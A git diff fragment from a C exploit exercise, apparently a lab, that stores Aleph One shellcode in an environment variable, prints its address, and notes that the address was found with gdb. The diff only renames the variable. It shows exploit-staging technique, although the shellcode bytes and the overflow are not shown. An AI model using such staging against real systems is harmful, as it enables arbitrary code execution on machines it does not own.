@@ -18,12 +18,12 @@ int main(void)
   char *env[2]; // Need environment variables
   
   // set an environment variable
-  int success = setenv("SHELLCODE", shellcodeAlephOne, 1);
-  char* env_ptr = getenv("SHELLCODE");
-  printf("Shellcode environment variable address: %p; success: %d\n", getenv("SHELLCODE"), success);
+  int success = setenv("ALEPHCODE", shellcodeAlephOne, 1);
+  char* env_ptr = getenv("ALEPHCODE");
+  printf("Shellcode environment variable address: %p; success: %d\n", getenv("ALEPHCODE"), success);
   printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);
 
-  // env_addr retrieved from running gdb and seeing where SHELLCODE env variable lives
+  // env_addr retrieved from running gdb and seeing where ALEPHCODE env variable lives
   // that value is hardcoded in shellcode.h
   char env_buffer[12];
   memcpy(env_buffer, env_addr, 4);
